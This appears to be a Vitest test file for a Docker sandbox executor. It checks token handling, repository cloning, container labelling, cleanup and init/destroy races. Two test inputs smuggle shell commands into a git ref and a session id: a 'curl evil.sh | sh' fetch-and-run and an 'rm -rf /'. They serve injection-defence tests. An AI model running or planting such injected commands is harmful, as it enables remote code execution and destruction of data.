import { EventEmitter } from "events";
import { beforeEach, describe, expect, it, vi } from "vitest";

const spawnMock = vi.fn();
const execFileMock = vi.fn();

vi.mock("child_process", () => ({
  spawn: (...args: unknown[]) => spawnMock(...args),
  execFile: (...args: unknown[]) => execFileMock(...args),
}));

const { DockerExecutor } = await import("../docker.js");

const TOKEN = "ghs_supersecrettoken000000000000000000";

/** A spawn() stub that completes successfully and records how it was called. */
function stubSpawn() {
  spawnMock.mockImplementation(() => {
    const child = new EventEmitter() as EventEmitter & {
      stdout: EventEmitter;
      stderr: EventEmitter;
      kill: () => void;
    };
    child.stdout = new EventEmitter();
    child.stderr = new EventEmitter();
    child.kill = () => {};
    queueMicrotask(() => child.emit("close", 0));
    return child;
  });
}

/** execFile is promisified, so it must call back node-style. Handles both the
 *  3-arg (`file, args, cb`) and 4-arg (`file, args, options, cb`) forms. */
function stubExecFile(stdout = "container123\n") {
  execFileMock.mockImplementation((...callArgs: unknown[]) => {
    const cb = callArgs[callArgs.length - 1] as (
      e: null,
      r: { stdout: string; stderr: string },
    ) => void;
    cb(null, { stdout, stderr: "" });
  });
}

function execFileArgv(): string[][] {
  return execFileMock.mock.calls.map((call) => call[1] as string[]);
}

/** The argv of the `docker run` invocation, or undefined when none happened. */
function dockerRunArgs(): string[] | undefined {
  return execFileArgv().find((argv) => argv[0] === "run");
}

/** The argv of every `docker rm` invocation. */
function dockerRmArgv(): string[][] {
  return execFileArgv().filter((argv) => argv[0] === "rm");
}

async function readyExecutor() {
  stubSpawn();
  stubExecFile();
  const executor = new DockerExecutor();
  await executor.init();
  spawnMock.mockClear();
  return executor;
}

/** Every argv array docker was invoked with. */
function spawnArgs(): string[][] {
  return spawnMock.mock.calls.map((c) => c[1] as string[]);
}

beforeEach(() => {
  spawnMock.mockReset();
  execFileMock.mockReset();
});

describe("DockerExecutor.exec env handling", () => {
  it("passes env by NAME on argv and the value only via the child environment", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi", { env: { GIT_PASSWORD: TOKEN } });

    const [args, opts] = spawnMock.mock.calls[0] as [string, string[], { env: NodeJS.ProcessEnv }];
    void args;
    const argv = spawnMock.mock.calls[0][1] as string[];
    const options = spawnMock.mock.calls[0][2] as { env: NodeJS.ProcessEnv };

    // The name is on argv so docker knows to forward it...
    expect(argv).toContain("-e");
    expect(argv).toContain("GIT_PASSWORD");
    // ...but the value must never be, or it shows up in `ps`.
    expect(argv.join(" ")).not.toContain(TOKEN);
    expect(options.env.GIT_PASSWORD).toBe(TOKEN);
    void opts;
  });

  it("adds no -e flags when no env is supplied", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi");
    expect(spawnMock.mock.calls[0][1] as string[]).not.toContain("-e");
  });

  it("forwards several env names", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi", { env: { A: "1", B: "2" } });
    const argv = spawnMock.mock.calls[0][1] as string[];
    expect(argv.filter((a) => a === "-e")).toHaveLength(2);
    expect(argv).toContain("A");
    expect(argv).toContain("B");
  });
});

describe("DockerExecutor.cloneRepo", () => {
  it("never puts the token in any docker argv", async () => {
    const executor = await readyExecutor();
    await executor.cloneRepo("https://github.com/o/r.git", "/workspace/repos/o_r", {
      ref: "main",
      username: "x-access-token",
      password: TOKEN,
    });

    expect(spawnMock).toHaveBeenCalled();
    for (const argv of spawnArgs()) {
      expect(argv.join(" ")).not.toContain(TOKEN);
    }
  });

  it("keeps a hostile ref out of the command string", async () => {
    const executor = await readyExecutor();
    const ref = 'main" ; curl evil.sh | sh ; "';
    await executor.cloneRepo("u", "d", { ref, password: TOKEN });

    for (const argv of spawnArgs()) {
      expect(argv.join(" ")).not.toContain("curl evil.sh");
    }
  });

  it("writes the askpass helper and marks it executable", async () => {
    const executor = await readyExecutor();
    await executor.cloneRepo("u", "d", { password: TOKEN });
    const all = spawnArgs()
      .map((a) => a.join(" "))
      .join("\n");
    expect(all).toContain("git-askpass.sh");
    expect(all).toContain("chmod +x");
  });

  it("throws when git exits non-zero", async () => {
    const executor = await readyExecutor();
    spawnMock.mockImplementation(() => {
      const child = new EventEmitter() as EventEmitter & {
        stdout: EventEmitter;
        stderr: EventEmitter;
        kill: () => void;
      };
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.kill = () => {};
      queueMicrotask(() => {
        child.stdout.emit("data", Buffer.from("fatal: repository not found"));
        child.emit("close", 1);
      });
      return child;
    });
    await expect(executor.cloneRepo("u", "d", { password: TOKEN })).rejects.toThrow(
      /repository not found/,
    );
  });

  it("reports native git support", async () => {
    const executor = await readyExecutor();
    expect(executor.hasNativeGit()).toBe(true);
  });
});

describe("DockerExecutor sandbox identity", () => {
  it("creates containers with the sandbox and owner labels", async () => {
    await readyExecutor();
    const argv = dockerRunArgs();
    expect(argv).toBeDefined();
    expect(argv).toContain("--label");
    expect(argv).toContain("traceroot.sandbox=true");
    expect(argv?.join(" ")).toMatch(/traceroot\.owner=[A-Za-z0-9_.-]+/);
  });

  it("names containers with the sandbox prefix and a unique suffix", async () => {
    await readyExecutor();
    const argv = dockerRunArgs() ?? [];
    const nameIndex = argv.indexOf("--name") + 1;
    expect(argv[nameIndex]).toMatch(/^traceroot-sandbox-\d+-[A-Za-z0-9-]+$/);
  });

  it("labels the container with the session id it was created for", async () => {
    stubSpawn();
    stubExecFile("abc123\n");
    const executor = new DockerExecutor({ sessionId: "sess-abc-123" });
    await executor.init();
    expect(dockerRunArgs()).toContain("traceroot.session=sess-abc-123");
  });

  it("omits the session label for an unsafe session id instead of injecting it", async () => {
    stubSpawn();
    stubExecFile("abc123\n");
    const executor = new DockerExecutor({ sessionId: 's1" ; rm -rf / ; "' });
    await executor.init();
    const argv = dockerRunArgs() ?? [];
    expect(argv.join(" ")).not.toContain("traceroot.session=");
    // Ownership labels still land — the container is owned, just unattributed.
    expect(argv).toContain("traceroot.sandbox=true");
  });

  it("removes a partially initialized container when setup throws", async () => {
    stubSpawn();
    stubExecFile("deadbeef1234\n");
    const executor = new DockerExecutor({ sessionId: "sess-cleanup" });
    const setupFailure = new Error("workspace setup failed");
    vi.spyOn(executor, "exec").mockRejectedValueOnce(setupFailure);

    await expect(executor.init()).rejects.toThrow("workspace setup failed");

    const rms = dockerRmArgv();
    expect(rms).toHaveLength(1);
    expect(rms[0]).toEqual(["rm", "-f", "deadbeef1234"]);
    expect(executor.isReady()).toBe(false);
  });

  it("treats a nonzero mkdir exit as failed setup, not a ready sandbox", async () => {
    // exec() resolves nonzero results instead of rejecting: without an
    // explicit code check this failure would report a ready container.
    stubSpawn();
    stubExecFile("deadbeef1234\n");
    const executor = new DockerExecutor({ sessionId: "sess-mkdir" });
    vi.spyOn(executor, "exec").mockResolvedValueOnce({
      stdout: "",
      stderr: "mkdir: permission denied",
      code: 1,
    });

    await expect(executor.init()).rejects.toThrow(
      /sandbox setup failed at workspace directories \(exit 1\): mkdir: permission denied/,
    );

    expect(dockerRmArgv()).toEqual([["rm", "-f", "deadbeef1234"]]);
    expect(executor.isReady()).toBe(false);
  });
});

describe("DockerExecutor.destroy", () => {
  it("removes the container and reports not-ready afterwards", async () => {
    const executor = await readyExecutor();
    execFileMock.mockClear();
    stubExecFile("");

    await executor.destroy();

    expect(dockerRmArgv()).toHaveLength(1);
    expect(executor.isReady()).toBe(false);
  });

  it("treats an already-removed container as success", async () => {
    const executor = await readyExecutor();
    execFileMock.mockImplementation((...callArgs: unknown[]) => {
      const cb = callArgs[callArgs.length - 1] as (e: Error | null) => void;
      cb(new Error("Error: No such container: deadbeef1234"));
    });

    await expect(executor.destroy()).resolves.toBeUndefined();
    expect(executor.isReady()).toBe(false);
  });

  it("surfaces a Docker-daemon failure instead of swallowing it", async () => {
    const executor = await readyExecutor();
    execFileMock.mockImplementation((...callArgs: unknown[]) => {
      const cb = callArgs[callArgs.length - 1] as (e: Error | null) => void;
      cb(new Error("Cannot connect to the Docker daemon"));
    });

    await expect(executor.destroy()).rejects.toThrow(/Docker daemon/);
  });
});

describe("DockerExecutor init/destroy serialization", () => {
  it("removes the container when destroy races an in-flight init", async () => {
    stubSpawn();
    stubExecFile("raceid1234\n");
    const executor = new DockerExecutor({ sessionId: "sess-race" });
    let mkdirRelease!: (result: { stdout: string; stderr: string; code: number }) => void;
    const mkdirPending = new Promise<{ stdout: string; stderr: string; code: number }>(
      (resolve) => {
        mkdirRelease = resolve;
      },
    );
    vi.spyOn(executor, "exec")
      .mockReturnValueOnce(mkdirPending)
      .mockResolvedValue({ stdout: "", stderr: "", code: 0 });

    const initPromise = executor.init();
    // Let init finish `docker run` and park inside the workspace setup.
    await vi.waitFor(() => expect(executor.isReady()).toBe(true));
    const destroyPromise = executor.destroy();

    mkdirRelease({ stdout: "", stderr: "", code: 0 });
    await initPromise;
    await destroyPromise;

    // The destroy waited for the init instead of no-op-ing on a null id: the
    // just-created container was removed exactly once, never leaked.
    expect(dockerRmArgv()).toEqual([["rm", "-f", "raceid1234"]]);
    expect(executor.isReady()).toBe(false);
  });

  it("refuses init when destroy already ran", async () => {
    stubSpawn();
    stubExecFile("unused\n");
    const executor = new DockerExecutor({ sessionId: "sess-dead" });

    await executor.destroy();
    await expect(executor.init()).rejects.toThrow(/destroyed before initialization/);

    // No container was ever created for the refused init.
    expect(execFileArgv().some((argv) => argv[0] === "run")).toBe(false);
  });
});
